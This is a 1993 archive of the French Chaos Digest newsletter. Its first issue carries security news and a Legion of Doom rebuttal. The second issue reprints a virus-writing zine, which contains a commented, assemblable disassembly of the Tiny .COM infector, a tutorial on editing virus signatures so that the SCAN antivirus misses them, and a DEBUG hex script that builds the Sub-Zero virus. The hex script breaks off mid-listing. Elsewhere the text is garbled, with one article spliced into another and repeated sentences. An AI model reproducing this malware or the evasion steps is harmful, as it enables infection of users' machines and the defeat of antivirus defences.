Institute for  Robert_Slade@sfu.ca      |     computer."
Research into  rslade@cue.bc.ca         | Jeff Richards'
User           p1@CyberStore.ca         | First Law of
Security       Canada V7K 2G6           | Data Security

------------------------------

End of Chaos Digest #1.23
************************************

Chaos Digest             Mercredi 12 Mai 1993        Volume 1 : Numero 24
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.24 (12 Mai 1993)
File 1--Systeme dissuasif de marquage antivol (produit)
File 2--Ass. espagnole contre le crime informatique (loi)
File 3--Raid du FBI... sans aucune raison (etranger)
File 4--A quoi sert le 3644? (technique)
File 5--The Legion of Doom: le retour (droit de reponse)
File 6--Scanning de masse des telex anglais sortants (espionnage)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: vol_protect@altern.com (vol_protect )
Subject: File 1--Systeme dissuasif de marquage antivol (produit)


   VOL PROTECT propose un systeme competitif de marquage des ordinateurs

     VOL PROTECT propose un systeme de protection contre le vol des
ordinateurs, a base de marquage antivol brevete (le 30 Aout 1991 a l' INPI
sous les references 9110769-71: "Dispositif de dissuasion de vol pour marquer
de maniere indelebile/inviolable et identifier un materiel/des cartes
electroniques") du materiel informatique et bureautique.

     Les marquages antivols sont personnalisables (texte au choix, logo et
couleurs de la societe).  Livre pret a poser, le marquage peut s'accompagner
d'un code barre qui facilite l'inventaire du parc.

     Arracher le marquage antivol provoque d'inportants degats sur la
machine en laissant des traces evidentes d'effraction.

     "Cela vaut la peine, lorsque l'on sait que le taux de vols dans les
entreprises dites "grands comptes" est de 2% par an, et qu'entre 1986 et
1988, 17,8% des entreprises ont ete victimes d'un vol de materiel."  Et
M. Jean-Noel Clot de citer les estimations du Centre de documentation et
d'informations des Assurances (CDIA): 110 MF de vols de materiels en 1991,
dont les 3/4 sont revendus: le vol represente 26,3% des crimes informatiques.
La repartition des vols par secteur economique est la suivante: services
47%, industrie 26,3%, finance 21%, non indique 5,3%.

     Le vol d'un ordinateur implique egalement en plus du materiel, le cout
de la reconstitution des donnees (voire du ou des logiciels, ainsi que
l'augmentation des primes d'assurances.

     Avec son systeme de marquage, Vol Protect offre gratuitement son logiciel
de gestion de parc micro, VP Parc, en saisissant pour le client, le catalogue
des appareils marques (fichier au format ASCII ou .DBF).

     De plus, un numero vert (05 17 33 02) est present sur chaque marquage,
afin que toute personne puisse verifier aupres de Vol Protect si votre
materiel a ete vole ou non.

     Garantie

     Vol Protect rembourse le marquage en cas de vol et les caracteristiques
permettant l'identification de la machine sont communiques aux organismes
tels que les constructeurs, les SAV, la police, etc.

     Contact

     Philippe Hassler, Ingenieur Commercial, Vol Protect, 101 Av. du General
Leclerc, 75014 Paris, France.
     Tel: +33 1 46 67 94 00
     Fax: +33 1 46 67 94 70

------------------------------

Date: Sat May  8 00:56:35 GMT 1993
From: gallardo@batman.fi.upm.es ("(Miguel Gallardo)" )
Subject: File 2--Ass. espagnole contre le crime informatique (loi)


                    Presentation of APEDANICA

During 1991 and 1992,  many things happened in Spain related with
computer risks.  Some of them went to the Court,  and many others
remain   in  an  unhealthy  silence.   Data  stolen  from  banks,
cryptology  used by  terrorist  organizations,  hacking,  piracy,
personal  dossiers  and  blackmailing have been  studied  by  the
police, lawyers, journalists and professional technicians.

Moreover,  a  deep  crisis  in Spanish economy does not  help  to
recover  any investment in data processing.  There are  too  many
unpaid  bills  and half performed projects in computing.  At  the
same  time,  politicians at the Parliament approved a new Law  on
Data Protection,  and a Data Protection Agency, a Computer Police
that is not clear enough who can control and how can it work.

Computer  victimization  is very high in Spain due  to  knowledge
lack and technical dependency from equipment and service sellers.
In  an increasingly complex and critical environments,  there  is
almost no local technology industry,  and multinationals are very
disconcerted  because  lack of  expertise,  expensive  commercial
nets,   counter-productive  promotional  efforts,  and  political
corruption on almost every local big business.

Since December 1992, there is an Association, APEDANICA, that can
help  to  discover sensible troubles related with  computers  and
communications,  and its markets.  Members of this non-profitable
organization acts like expert witness, cryptologist, lawyers, and
even as Sherlock Holmes in computer environments.

APEDANICA  (ASOCIACION  PARA LA PREVENCION Y ESTUDIO  DE  DELITOS
ABUSOS Y NEGLIGENCIAS EN INFORMATICA Y COMUNICACIONES AVANZADAS),
Spanish   Legal  Advanced  Communications  and   Computer   Crime
Association,  is very interested in developing relationships with
any other organization with similar goals, all over the World.


      _ _ _               _  Miguel A. Gallardo Ortiz, PX86 Engineer
     ' ) ) )             //  UNIX&C instructor working on RSA crypto
      / / / o __     _  //   P.O. Box 17083 - E-28080 Madrid (Spain)
     / ' (_<_(_//_/_ bon isolement de la ligne.
   * une tonalite hachee lente   --> fuite a la terre.
   * une tonalite hachee rapide  --> fuite entre fils de ligne.

   Voila le test d'isolement termine.

5. Raccrocher et attendre la sonnerie.

6. Decrocher alors, vous pouvez entendre:
   * une tonalite grave continue --> 33 < I < 50 mA (normal).
   * une tonalite hachee lente   --> I < 33 mA (trop faible).
   * une tonalite hachee rapide  --> 50 < I < 70 mA (trop forte).
   * une tonalite irreguliere    --> I > 70 mA (beaucoup trop forte).

7. Raccrocher pour terminer le test.

------------------------------

Date: 13 May 1993 21:55:46 -0400
From: todd@hal.gnu.ai.mit.edu (The Marauder)
Subject: File 5--The Legion of Doom: le retour (droit de reponse)
Repost from: telecom13.327.7@eecs.nwu.edu


Let me set the record straight:

This "NEW" Legion of Doom, coming from "tdc@zooid.guild.org" has _NOTHING_
whatsoever to do with the Legion of Doom! group that was formed approximately
mid-1984, of which I was a member. The "real" LoD continued as a group until
somewhere around 1990.  Those of you really interested in the whole thing can
read all about it in the electronic publication called "Phrack", which is
available at the anon ftp site "ftp.eff.org", in the "/pub/cud/phrack"
directory.

I believe "Phrack" issue #31 contains "The History of The Legion of Doom!"
which was written by Lex Luthor (founder of the whole thing), and edited by
Erik Bloodaxe. The article contains a brief history of us, and ALL them
members of the real group, and is the final word as to who was/was not in
LoD. I think you will find no mention of this (ahem) Lord Havoc character.
I believe "ftp.eff.org" also contains all the LOD Technical Journals in
"pub/cud/lod". The Legion of Doom!  as a hack/phreak group DOES NOT EXIST
ANYMORE.  These clowns running around the internet calling themselves the
"NEW" LoD are simply some all the LOD Technical Journals in "pub/cud/lod".
The Legion of Doom!  as a hack/phreak group DOES NOT EXIST ANYMORE. These
clowns running around the internet calling themselves the "NEW" LoD are
simply some kids having fun with you all, so relax, take a deep breath, and
forget the whole thing. I am quite convinced you'll not hear much more from
them ;).

Most of the horror stories, and tales of terror you have read and heard about
us (real LOD), are way off base. Very few of you were around, or involved
with the "BBS" underground world back when we existed as a group so any "data"
you have about us is heresay at best.  (Although I'm sure you guys at AT&T
could probably find some fairly accurate information in "Ralph's" files,
heh ;) ). Anyway, speaking for me, I simply became obsessed with the telephone
system; it is after all the largest interconnected entity I know of. The last
thing I or any of the members of the LOD wanted to do is wreck or destroy the
very thing that caused us to come into existence in the first place. Sure we
looked at a few things we damn well had no business seeing, and yes we
occasionally impersonated the Arlington RNOC for WATS translations and what
have you. But as to being the wandering band of "Digital Henchmen" who left
smoking, crumpled 1AESS's in our wake -- you could not be further from the
truth!  I often laugh out loud at the media's portrayal of us and our
activities, as they are by far the most clueless of the lot.

Most of the original members of the LOD have remained friends, and stay in
fairly current contact with each other, sometimes swapping stories of our old
memories over a beer or two, when we have time.  That's about the extent of
it.

Forget about this "Return of the Legion of Doom!". Like a bad smell, it's
sure to blow away.

The Marauder   Legion of Doom!   Marauder@phantom.com

------------------------------

Date: Fri, 26 Feb 93 17:30:55
From: I_USERID_4@prime1.central-lancashire.ac.uk (James Faircliffe )
Subject: File 6--Scanning de masse des telex anglais sortants (espionnage)


A few months ago, a well-respected British TV documentary show (might have
been 'World in Action') discovered that all out-going telexes from the Uk were
electronically scanned by British Telecom (the main phone company) personnel,
supervised by the security services.  Direct scanning by the security services
would have been illegal.  They were looking for words like 'terrorist' &
'bomb', but the civil liberties implications are far-reaching.  Obviously,
this could affect the privacy of American telexes to the U.K.

J.F. Faircliffe.
i_userid_4@p1.uclan.ac.uk

[ChaosD: Etonne de cette information publiee dans "Computer Privacy Digest"
v2 #021, je decidai d'ecrire au President de BT.  Voici sa reponse:]

BT Centre Room A730 81 Newsgate Street LONDON EC1A 7AJ
Office of the Chairman

J B Condat Esq

                                          2 March 1993

Dear Mr Condat

Thank you for your facsimile message of 28 February.

I can confirm that BT would not be involved in the "scanning" of
outgoing telexes from the UK for security reasons.

I would not therefore be able to provide you with any information
on this matter.

                                          Yours sincerely

                                          /signed/
                                          DAVID BROWN
                                          Assistant to the Chairman

------------------------------

End of Chaos Digest #1.24
************************************

Chaos Digest             Lundi 17 Mai 1993          Volume 1 : Numero 25
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.25 (17 Mai 1993)
File 1--40H VMag Issue 1 Volume 1 #000-3 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 1 #000-3 (reprint)


40H Vmag Issue 1 Volume 1                                               00000

Introduction -

This is a down and dirty zine on wich gives examples on writing viruses
and this magazines contains code that can be compiled to viruses.

If you are an anti-virus pussy, who is just scared that your hard disk will
get erased so you have a psycological problem with viruses, erase these files.
This aint for you.

                                 INDEX

001...........................Virus Spotlight, The Tiny virus
002...........................How to modify viruses to avoid SCAN
003...........................Sub-Zero virus
004...........................Simple encryption techniques and Leprosy-B
005...........................1992 virus

Staff -

        Editior, Technical Consultant - Hellraiser
        Co-Editor, Theory Consultant  - Bionic Slasher

+++++

40H Vmag Issue 1 Volume 1                                               00001

                          - VIRUS SPOTLIGHT -

     The first virus I would like to spotlight is the Tiny virus, lets see
what our good friend Patti Hoffman (bitch) has written about it.

Name:        Tiny
Aliases:     163 COM Virus, Tiny 163 Virus, Kennedy-163
V Status:    Rare
Discovery:   June, 1990
Symptoms:    COMMAND.COM & .COM file growth
Origin:      Denmark
Eff Length:  163 Bytes
Type Code:   PNCK - Parasitic Non-Resident .COM Infector
Detection Method:  ViruScan V64+, VirexPC, F-Prot 1.12+, NAV, IBM Scan 2.00+
Removal Instructions: Scan/D, F-Prot 1.12+, or Delete infected files
General Comments:
      The 163 COM Virus, or Tiny Virus, was isolated by Fridrik Skulason
      of Iceland in June 1990.  This virus is a non-resident generic
      .COM file infector, and it will infect COMMAND.COM.

      The first time a file infected with the 163 COM Virus is executed,
      the virus will attempt to infect the first .COM file in the
      current directory.  On bootable diskettes, this file will normally
      be COMMAND.COM.  After the first .COM file is infected,each time
      an infected program is executed another .COM file will attempt to
      be infected.  Files are infected only if their original length is
      greater than approximately 1K bytes.

      Infected .COM files will increase in length by 163 bytes, and have
      date/time stamps in the directory changed to the date/time the
      infection occurred.  Infected files will also always end with this
      hex string: '2A2E434F4D00'.

      This virus currently does nothing but replicate, and is the
      smallest MS-DOS virus known as of its isolation date.

      The Tiny Virus may or may not be related to the Tiny Family.
      ^like she'd know the difference!

OK, Theres the run down on the smallest MS-DOS virus known to man.  As for
it being detected by SCAN we'll see about that.

Here is a dissasembly of the virus, It can be assembled under Turbo Assembler
or MASM.

-----------------------------------------------------------------------------

PAGE  59,132

data_2e         equ     1ABh                 ;start of virus

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a   ;assume cs, ds - code

                org     100h                 ;orgin of all COM files
s               proc    far

start:
                jmp     loc_1                ;jump to virus

;this is a replacement for an infected file

                db      0CDh, 20h, 7, 8, 9   ;int 20h
                                             ;pop es

loc_1:
                call    sub_1

s               endp

sub_1           proc    near
                pop     si                   ;locate all virus code via
                sub     si,10Bh              ;si, cause all offsets will
                mov     bp,data_1[si]        ;change when virus infects
                add     bp,103h              ;a COM file
                lea     dx,[si+1A2h]         ;offset of '*.COM',0 - via SI
                xor     cx,cx                ;clear cx - find only normal
                                             ;attributes
                mov     ah,4Eh               ;find first file
loc_2:
                int     21h

                jc      loc_6                ;no files found? then quit
                mov     dx,9Eh               ;offset of filename found
                mov     ax,3D02h             ;open file for read/write access
                int     21h

                mov     bx,ax                ;save handle into bx
                mov     ah,3Fh               ;read from file
                lea     dx,[si+1A8h]         ;offset of save buffer
                mov     di,dx
                mov     cx,3                 ;read three bytes
                int     21h

                cmp     byte ptr [di],0E9h   ;compare buffer to virus id
                                             ;string
                je      loc_4
loc_3:
                mov     ah,4Fh               ;find the next file
                jmp     short loc_2          ;and test it
loc_4:
                mov     dx,[di+1]            ;lsh of offset
                mov     data_1[si],dx
                xor     cx,cx                ;msh of offset
                mov     ax,4200h             ;set the file pointer
                int     21h
                mov     dx,di                ;buffer to save read
                mov     cx,2                 ;read two bytes
                mov     ah,3Fh               ;read from file
                int     21h
                cmp     word ptr [di],807h   ;compare buffer to virus id
                je      loc_3                ;same? then find another file

;heres where we infect a file

                xor     dx,dx                ;set file pointer
                xor     cx,cx                ;ditto
                mov     ax,4202h             ;set file pointer
                int     21h

                cmp     dx,0                 ;returns msh
                jne     loc_3                ;not the same? find another file
                cmp     ah,0FEh              ;lsh = 254???
                jae     loc_3                ;if more or equal find another
file

                mov     ds:data_2e[si],ax    ;point to data
                mov     ah,40h               ;write to file
                lea     dx,[si+105h]         ;segment:offset of write buffer
                mov     cx,0A3h              ;write 163 bytes
                int     21h

                jc      loc_5                ;error? then quit
                mov     ax,4200h             ;set file pointer
                xor     cx,cx                ;to the top of the file
                mov     dx,1
                int     21h

                mov     ah,40h               ;write to file
                lea     dx,[si+1ABh]         ;offset of jump to virus code
                mov     cx,2                 ;two bytes
                int     21h

;now close the file

loc_5:
                mov     ah,3Eh               ;close file
                int     21h

loc_6:
                jmp     bp                   ;jump to original file

data_1          dw      0
                db      '*.COM',0            ;wild card search string


sub_1           endp
seg_a           ends
                end     start

---------------------------------------------------------------------------

Its good to start off with a simple example like this.  As you can see
what the virus does is use the DOS 4Eh function to find the firsy COM file
in the directory.  If no files are found the program exits.  If a file is
found it compares the virus id string (the virus jump instruction) to the
first two bytes of the COM file.  If they match the program terminates.
If they don't match the virus will infect the file.  Using two key MS-DOS
functions to infect.

The first -

INT 21h Function 42h
SET FILE POINTER

AH   =   42h
AL   =   method code
BX   =   file handle
CX   =   most significant half to offset
DX   =   least "                       "

If there is an error in executing this function the carry flag will be set,
and AX will contian the error code.  If no error is encountered

DX   =   most significant half of file pointer
AX   =   least "                             "

The second (and most) important function used by any virus is

INT 21h Function 40h
WRITE TO FILE OR DEVICE

AH    =   40h
BX    =   handle
CX    =   number of bytes to write
DS:DX =   segment of buffer

Returns

AX    =   bytes transferred

on error

AX    =  Error Code and flag is set.

An example of Function 40h is ----

     mov     ah,40h                   ;set function
     mov     bx,handle                ;load bx with handle from prev open
     mov     cx,virus_size            ;load cx with # of bytes to write
     mov     dx,offset write_buffer   ;load dx with the offset of what to
                                      ;write to file
     int     21h                      ;

This function is used by 98% of all MS-DOS viruses to copy itself to a
victim file.

Now heres a sample project -  create a new strain of Tiny, have it restore
the original date and time etc...

                                                                          HR

+++++

40H Vmag Issue 1 Volume 1                                               00002

             -  HOW TO MODIFY A VIRUS SO SCAN WON'T CATCH IT -
                                   OR
                     HOW TO CREATE NEW VIRUS STRAINS


The problem with most viruses is that this dickhead who lives in California
named John Mcafee gets his greedy hands on them and turns them into big
bucks -- for him.   John boy is the reason there are over 500 viruses out
there, and I wouldn't doubt if he weren't resposible for  writing at least
ten of them.

So the best thing to do to some Mcafee dependant sucker, or lame board is
this.

Say you have a copy of a played out virus, lets say an older one like
Armstand or Jerusalem.  Almost every virus scanner can detect these
viruses cause they been around so long.  Now heres a quick way to modify
viruses so the scanners wont catch them, in turn making them new strains.

The tools you need are --

                          Norton Utilites
                          Debug          and/or
                          Turbo Debugger by Borland

Now heres what you do.

Step A
------

Make a target file like this with Debug

Copy the below file with your editor to a file called SAMPLE.USR

-----------------------------------------------------------------------------
n sample.com
a
int 20

rcx
2
w
q
-----------------------------------------------------------------------------
Then uses Debug to make the file SAMPLE.COM executing this command --

DEBUG < SAMPLE.USR

This will make a two byte called SAMPLE.COM

STEP B
------

Infect the file with the virus.  If this is a boot sector virus your on
your own.  Do whatever you have to to infect the two byte file.

Make a copy of the file and keep it for safe keeping.

STEP C
------

Load up DISKEDIT, which comes with Norton 6.0 (I'm not sure if its in the
lower versions) PCTOOLS Hex Editor will work too but it takes more work.

Now have DISKEDIT Hex-edit the infected file.

Now figure out where the middle of the file is.  Next put block on and
go to the end of the file.  At the end of the file go to the edit screen and
select fill.  Fill the lower half of the file will nonsense characters, its
good to select 255d (FFh) the blank character.

Now save your changes and go to DOS

Now use SCAN to scan the file for viruses.  If it detects the virus you
didnt delete the search string that SCAN is searching for.  Get it???

You see all SCAN does is search files for strings that are related to viruses.
For example if SCAN was looking for CASCADE it look for something like this-

                        EB1DAD1273D1FF121F

In every file you specify.  So what we are doing is narrowing down where that
string is in the virus that SCAN keeps finding.

So what you have to do is keep deleting parts of the virus with DISKEDIT
untill you finally narrow down the string.

Keep this in mind, search strings are in the first 150 bytes of the file
about 75% of the time.

Ok lets say you narrowed down the search string and lets say it's -

                      B8 92 19 B7 21 CD

It will most likly be longer but this an example.

Now back to DEBUG - Do the following--

DEBUG

E 0100 b8 92 19 b7 21 cd    -- this is the string you found

Then type --

U

This will give you a unassembled look at what the id-string is.  In this
example it was

                       mov  ax,1992h
                       mov  bx,21h
                       int  21h

Now this is what you have to do, and keep in mind the following ---

THE FOLLOWING TAKES A SOMEWHAT KNOWING OF ASSEMBLER AND HOW IT WORKS!!!!!!

Uses Turbo Debugger to find the string, you can use DEBUG but I don't know
how to do this from debug.

Ok say you got the string on the screen --

                       mov  ax,1992h
                       mov  bh,21h
                       int  21h

Write down the locations in the file where these strings are.  Ex 0100h etc..

Now rearrange the AX mov with the BX mov like this ---

                        mov bh,21h
                        mov ax,1992h
                        int 21h

You see?  You didn't change the way the code functions (THATS IF YOU KNOW
WHAT YOUR DOING!) but you changed the codes id-string for SCAN.

Now since Turbo Debugger dosent let you save the changes you must do it
via - Debug.

DEBUG virus.com

a 0122  - This is the address of the string

Now enter the assembler instructions --

                         mov bh,21
                         mov ax,1992h
                         int 21h

w

q

Save it and SCAN it, if SCAN doesn't catch it Congrats.  If it does ---
back to the lab.  Oh well you get the point.

One warning, this only works with un-encrypting viruses, or on the
encryption mechanism of encrypting files (which will most likely be Scanned).

With that in mind, have fun.

                                                                           HR

+++++

40H Vmag Issue 1 Volume 1                                               00003

                           - SUB-ZERO VIRUS -

    Heres one for all of you who don't have an assembler.  It can be
compiled using debug by naming the insert below SUB-ZERO.USR and
executing the command -

                        DEBUG < SUB-ZERO.USR

-----------------------------------------------------------------------------
n sub-zero.com
e 0100  E9 92 00 DA AA A3 AA D4 3A A3 00 01 23 31 00 00
e 0110  00 02 00 04 01 64 30 A0 06 55 2E 56 05 9F 19 A5
e 0120  3E 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
e 0130  0E 97 30 80 00 00 00 80 00 97 30 5C 00 97 30 6C
e 0140  00 97 30 00 40 46 63 F4 1D D0 5C 00 00 46 00 4D
e 0150  5A A0 01 39 00 B4 02 AF 00 7C 04 7C A4 FA 05 10
e 0160  07 84 19 C5 00 FA 05 1C 00 00 00 00 00 00 00 00
e 0170  05 00 20 00 21 00 28 02 00 02 10 00 90 6A 00 00
e 0180  B9 41 2A 97 4C 4F 52 44 20 53 4B 49 53 4D 20 01
e 0190  00 00 00 00 00 FC B4 E0 CD 21 3D 00 E0 73 16 80
e 01A0  FC 03 72 11 BF 00 01 B4 DD BE 10 07 03 F7 2E 8B
e 01B0  8D 11 00 CD 21 8C C8 04 10 00 8E D0 BC 00 07 50
e 01C0  B8 C5 00 50 CB 06 FC 2E 8C 06 31 00 2E 8C 06 39
e 01D0  00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10 00
e 01E0  2E 01 06 49 00 2E 01 06 45 00 B4 E0 CD 21 80 FC
e 01F0  E0 73 13 80 FC 03 07 2E 8E 16 45 00 2E 8B 26 43
e 0200  00 2E FF 2E 47 00 33 C0 8E C0 8B 89 31 DB 2E A3
e 0210  4B 00 26 A0 FE 03 2E A2 4D 00 26 C7 06 FC 03 F3
e 0220  A5 26 C6 06 FE 03 CB 58 04 10 90 8E C0 0E 1F B9
e 0230  00 03 B1 88 33 F6 8B FE 06 B8 42 01 50 EA FC 03
e 0240  00 00 8C C8 8E D0 BC 00 07 33 C0 8E D8 2E A1 4B
e 0250  00 A3 FC 03 2E A0 4D 00 A2 FE 03 8B DC B1 04 D3
e 0260  EB 83 C3 10 2E 89 1E 33 00 B4 4A 2E 8E 06 31 00
e 0270  CD 21 B8 21 35 CD 21 2E 89 1E 17 00 2E 8C 06 19
e 0280  00 0E 1F BA 5B 02 B8 21 25 CD 21 8E 06 31 00 26
e 0290  8E 06 2C 00 33 FF B9 FF 7F 32 C0 F2 AE 26 38 05
e 02A0  E0 F9 8B D7 83 C2 03 B8 00 4B 06 1F 0E 07 BB 35
e 02B0  00 52 51 53 50 06 1E B4 2A CD 21 2E C6 06 0E 00
e 02C0  00 81 F9 C6 07 74 30 3C 05 75 0D 80 FA 17 72 08
e 02D0  2E FE 06 0E 00 EB 20 90 B8 08 35 CD 21 2E 89 1E
e 02E0  13 00 2E 8C 06 15 00 0E 1F C7 06 1F 00 48 3F B8
e 02F0  08 25 BA 1E 02 CD 21 1F 07 58 5B 59 5A 9C 2E FF
e 0300  1E 17 00 1E 07 B4 49 CD 21 B4 4D CD 21 B4 31 BA
e 0310  00 06 B1 04 D3 EA 83 C2 10 CD 21 32 C0 CF 2E 83
e 0320  3E 1F 00 09 75 17 52 51 50 B4 2A CD 21 81 FA 06
e 0330  06 75 07 B8 01 07 B2 80 CD 13 58 59 5A 2E 83 2E
e 0340  1F 00 01 EB 11 20 20 53 75 62 2D 5A 65 72 6F 20
e 0350  4E 59 48 43 20 20 2E FF 2E 13 00 9C 80 FC E0 75
e 0360  05 B8 00 03 9D CF 80 FC DE 74 2D 80 FC DD 74 0E
e 0370  3D 00 4B 75 03 E9 B4 00 9D 2E FF 2E 17 00 58 58
e 0380  B8 00 01 2E A3 0A 00 58 2E A3 0C 00 F3 A4 9D 2E
e 0390  A1 0F 00 2E FF 2E 0A 00 83 C4 06 9D 8C C8 8E D0
e 03A0  BC 10 07 06 06 33 FF 0E 07 B9 10 00 8B F3 BF 21
e 03B0  00 F3 A4 8C D8 8E C0 2E F7 26 7A 00 2E 03 06 2B
e 03C0  00 83 D2 00 2E F7 36 7A 00 8E D8 8B F2 8B FA 8C
e 03D0  C5 2E 8B 1E 2F 00 0B DB 74 13 B9 00 80 F3 A5 05
e 03E0  00 10 81 C5 00 10 8E D8 8E C5 4B 75 ED 2E 8B 0E
e 03F0  2D 00 F3 A4 58 50 05 10 00 2E 01 06 29 00 2E 01
e 0400  06 25 00 2E A1 21 00 1F 07 2E 8E 16 29 00 2E 8B
e 0410  26 27 00 2E FF 2E 23 00 33 C9 B8 01 43 CD 21 B4
e 0420  3C CD 21 B8 00 4B 9D 2E FF 2E 17 00 2E 80 3E 0E
e 0430  00 01 74 E4 2E C7 06 70 00 FF FF 2E C7 06 8F 00
e 0440  00 00 2E 89 16 80 00 2E 8C 1E 82 00 50 53 51 52
e 0450  56 57 1E 06 FC 8B FA 32 D2 80 7D 01 3A 75 05 8A
e 0460  15 80 E2 1F B4 36 CD 21 3D FF FF 75 03 E9 77 02
e 0470  F7 E3 F7 E1 0B D2 75 05 3D 10 07 72 F0 2E 8B 16
e 0480  80 00 1E 07 32 C0 B9 41 00 F2 AE 2E 8B 36 80 00
e 0490  8A 04 0A C0 74 0E 3C 61 72 07 3C 7A 77 03 80 2C
e 04A0  20 46 EB EC B9 0B 00 2B F1 BF 84 00 0E 07 B9 0B
e 04B0  00 F3 A6 75 03 E9 2F 02 B8 00 43 CD 21 72 05 2E
e 04C0  89 0E 72 00 72 25 32 C0 2E A2 4E 00 1E 07 8B FA
e 04D0  B9 41 00 F2 AE 80 7D FE 4D 74 0B 80 7D FE 6D 74
e 04E0  05 2E FE 06 4E 00 B8 00 3D CD 21 72 5A 2E A3 70
e 04F0  00 8B D8 B8 02 42 B9 FF FF BA FB FF CD 21 72 EB
e 0500  05 05 00 2E A3 11 00 B9 05 00 BA 6B 00 8C C8 8E
e 0510  D8 8E C0 B4 3F CD 21 8B FA BE 05 00 F3 A6 75 07
e 0520  B4 3E CD 21 E9 C0 01 B8 24 35 CD 21 89 1E 1B 00
e 0530  8C 06 1D 00 BA 1B 02 B8 24 25 CD 21 C5 16 80 00
e 0540  33 C9 B8 01 43 CD 21 72 3B 2E 8B 1E 70 00 B4 3E
e 0550  CD 21 2E C7 06 70 00 FF FF B8 02 3D CD 21 72 24
e 0560  2E A3 70 00 8C C8 8E D8 8E C0 8B 1E 70 00 B8 00
e 0570  57 CD 21 89 16 74 00 89 0E 76 00 B8 00 42 33 C9
e 0580  8B D1 CD 21 72 3D 80 3E 4E 00 00 74 03 EB 57 90
e 0590  BB 00 10 B4 48 CD 21 73 0B B4 3E 8B 1E 70 00 CD
e 05A0  21 E9 43 01 FF 06 8F 00 8E C0 33 F6 8B FE B9 10
e 05B0  07 F3 A4 8B D7 8B 0E 11 00 8B 1E 70 00 06 1F B4
e 05C0  3F CD 21 72 1C 03 F9 33 C9 8B D1 B8 00 42 CD 21
e 05D0  BE 05 00 B9 05 00 F3 2E A4 8B CF 33 D2 B4 40 CD
e 05E0  21 72 0D E9 BC 00 B9 1C 00 BA 4F 00 B4 3F CD 21
e 05F0  72 4A C7 06 61 00 84 19 A1 5D 00 A3 45 00 A1 5F
e 0600  00 A3 43 00 A1 63 00 A3 47 00 A1 65 00 A3 49 00
e 0610  A1 53 00 83 3E 51 00 00 74 01 48 F7 26 78 00 03
e 0620  06 51 00 83 D2 00 05 0F 00 83 D2 00 25 F0 FF A3
e 0630  7C 00 89 16 7E 00 05 10 07 83 D2 00 72 3A F7 36
e 0640  78 00 0B D2 74 01 40 A3 53 00 89 16 51 00 A1 7C
e 0650  00 8B 16 7E 00 F7 36 7A 00 2B 06 57 00 A3 65 00
e 0660  C7 06 63 00 C5 00 A3 5D 00 C7 06 5F 00 10 07 33
e 0670  C9 8B D1 B8 00 42 CD 21 72 0A B9 1C 00 BA 4F 00
